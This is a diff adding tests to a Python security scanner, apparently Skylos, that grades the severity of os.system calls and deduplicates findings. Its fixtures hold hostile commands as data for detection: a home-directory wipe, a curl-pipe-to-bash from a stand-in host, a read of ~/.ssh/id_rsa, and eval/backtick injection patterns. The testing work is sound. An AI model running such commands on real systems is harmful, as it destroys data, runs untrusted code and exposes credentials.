@@ -45,6 +45,174 @@ def test_os_system(tmp_path):
     assert "SKY-D203" in _rule_ids(out)
 
 
+def _d203_severity_by_line(findings):
+    return {f["line"]: f["severity"] for f in findings if f["rule_id"] == "SKY-D203"}
+
+
+OS_SYSTEM_SEVERITY_CODE = """import os
+import sys
+
+def release(version, target):
+    os.system("twine upload dist/*")
+    os.system(f"git tag v1.0 && git push --tags")
+    os.system("python setup.py " + "sdist")
+    os.system("{} setup.py sdist".format(sys.executable))
+    os.system("git tag v" + version)
+    os.system(f"git tag v{version}")
+    os.system(target)
+"""
+
+
+def test_os_system_constant_command_is_low_and_dynamic_stays_critical(tmp_path):
+    # kennethreitz/records setup.py: fixed release commands are not injectable.
+    expected = {
+        5: "LOW",
+        6: "LOW",
+        7: "LOW",
+        8: "CRITICAL",
+        9: "CRITICAL",
+        10: "CRITICAL",
+        11: "CRITICAL",
+    }
+    out = _scan_one(tmp_path, "release.py", OS_SYSTEM_SEVERITY_CODE)
+    assert _d203_severity_by_line(out) == expected
+    rule_findings = _scan_dangerous_calls_rule(OS_SYSTEM_SEVERITY_CODE)
+    assert _d203_severity_by_line(rule_findings) == expected
+
+
+def test_os_system_dangerous_constant_command_stays_critical(tmp_path):
+    code = (
+        "import os\n"
+        "os.system('rm -rf ~')\n"
+        "os.system('curl -fsSL https://install.example/setup.sh | bash')\n"
+        "os.system('cat ~/.ssh/id_rsa')\n"
+        "os.system('rm -rf /root/.cache/pip')\n"
+    )
+    expected = {2: "CRITICAL", 3: "CRITICAL", 4: "CRITICAL", 5: "LOW"}
+    out = _scan_one(tmp_path, "wipe.py", code)
+    assert _d203_severity_by_line(out) == expected
+    assert _d203_severity_by_line(_scan_dangerous_calls_rule(code)) == expected
+
+
+def test_danger_findings_dedupe_by_rule_file_and_line():
+    from skylos.rules.danger.danger import dedupe_findings
+
+    rows = [
+        ("SKY-D211", "HIGH", "a.py", 3),
+        ("SKY-D211", "CRITICAL", "a.py", 3),
+        ("SKY-D217", "CRITICAL", "a.py", 3),
+        ("SKY-D211", "CRITICAL", "a.py", 4),
+        ("SKY-D211", "CRITICAL", "b.py", 3),
+    ]
+    findings = [
+        {"rule_id": rule, "severity": severity, "file": file, "line": line}
+        for rule, severity, file, line in rows
+    ]
+    deduped = dedupe_findings(findings)
+    assert [(f["rule_id"], f["file"], f["line"], f["severity"]) for f in deduped] == [
+        ("SKY-D211", "a.py", 3, "CRITICAL"),
+        ("SKY-D217", "a.py", 3, "CRITICAL"),
+        ("SKY-D211", "a.py", 4, "CRITICAL"),
+        ("SKY-D211", "b.py", 3, "CRITICAL"),
+    ]
+
+
+def test_danger_dedupe_preserves_distinct_sinks_and_evidence_on_one_line():
+    from skylos.rules.danger.danger import dedupe_findings
+
+    first = {
+        "rule_id": "SKY-D211",
+        "severity": "CRITICAL",
+        "file": "a.py",
+        "line": 3,
+        "col": 4,
+        "metadata": {"security_evidence": {"source": "request.args['a']"}},
+    }
+    second = {
+        **first,
+        "col": 25,
+        "metadata": {"security_evidence": {"source": "request.args['b']"}},
+    }
+    assert dedupe_findings([first, dict(first), second]) == [first, second]
+
+
+def test_distinct_sql_sinks_on_one_line_survive_scan_output(tmp_path):
+    code = (
+        "from flask import request\n"
+        "def find(conn):\n"
+        "    conn.execute(request.args['a']); conn.execute(request.args['b'])\n"
+    )
+    out = _scan_one(tmp_path, "separate_sinks.py", code)
+    hits = [finding for finding in out if finding["rule_id"] == "SKY-D211"]
+    assert [(finding["line"], finding["col"]) for finding in hits] == [(3, 4), (3, 37)]
+
+
+def test_os_system_cache_target_expansion_stays_critical(tmp_path):
+    code = "import os\nos.system('rm -rf /tmp/$TARGET')\n"
+    expected = {2: "CRITICAL"}
+    assert (
+        _d203_severity_by_line(_scan_one(tmp_path, "dynamic_cache.py", code))
+        == expected
+    )
+    assert _d203_severity_by_line(_scan_dangerous_calls_rule(code)) == expected
+
+
+def test_os_system_shell_expansion_retains_critical_severity(tmp_path):
+    code = (
+        "import os\n"
+        "os.system('eval \"$COMMAND\"')\n"
+        "os.system('$COMMAND')\n"
+        "os.system('bash -c \"$COMMAND\"')\n"
+        "os.system(\"bash -c '$COMMAND'\")\n"
+        "os.system(\"eval '$COMMAND'\")\n"
+        "os.system('echo `cat command.txt`')\n"
+        "os.system(\"printf '%s' '$COMMAND'\")\n"
+    )
+    expected = {
+        2: "CRITICAL",
+        3: "CRITICAL",
+        4: "CRITICAL",
+        5: "CRITICAL",
+        6: "CRITICAL",
+        7: "CRITICAL",
+        8: "LOW",
+    }
+    assert (
+        _d203_severity_by_line(_scan_one(tmp_path, "shell_expansion.py", code))
+        == expected
+    )
+    assert _d203_severity_by_line(_scan_dangerous_calls_rule(code)) == expected
+
+
+def test_worker_dedupe_keeps_distinct_calls_and_merges_duplicate_checkers(tmp_path):
+    import ast
+    from types import SimpleNamespace
+    from skylos.analysis.file_worker import _danger_findings
+
+    source = (
+        "import os\n"
+        "from sqlalchemy import text\n"
+        "def run(conn, target, query):\n"
+        '    os.system("twine upload dist/*"); os.system(target)\n'
+        "    conn.execute(text(query))\n"
+    )
+    findings, error = _danger_findings(
+        tmp_path / "worker.py",
+        SimpleNamespace(source=source, tree=ast.parse(source)),
+        SimpleNamespace(full_scan=True, enable_danger_rules=True),
+    )
+    assert error is None
+    d203 = [finding for finding in findings if finding["rule_id"] == "SKY-D203"]
+    assert [
+        (finding["line"], finding["col"], finding["severity"]) for finding in d203
+    ] == [
+        (4, 4, "LOW"),
+        (4, 38, "CRITICAL"),
+    ]
+    d211 = [finding for finding in findings if finding["rule_id"] == "SKY-D211"]
+    assert [(finding["line"], finding["col"]) for finding in d211] == [(5, 17)]
+
+
 def test_pickle_loads(tmp_path):
     out = _scan_one(
         tmp_path, "a_pickle.py", "import pickle\npickle.loads(b'\\x80\\x04K\\x01.')\n"
@@ -250,11 +418,7 @@ def test_flask_debug_mode_flags(tmp_path):
     out = _scan_one(
         tmp_path,
         "a_flask_debug.py",
-        (
-            "from flask import Flask\n"
-            "app = Flask(__name__)\n"
-            "app.run(debug=True)\n"
-        ),
+        ("from flask import Flask\napp = Flask(__name__)\napp.run(debug=True)\n"),
     )
     assert "SKY-D346" in _rule_ids(out)
 
@@ -263,11 +427,7 @@ def test_flask_debug_false_does_not_flag(tmp_path):
     out = _scan_one(
         tmp_path,
         "a_flask_debug_false.py",
-        (
-            "from flask import Flask\n"
-            "app = Flask(__name__)\n"
-            "app.run(debug=False)\n"
-        ),
+        ("from flask import Flask\napp = Flask(__name__)\napp.run(debug=False)\n"),
     )
     assert "SKY-D346" not in _rule_ids(out)
 
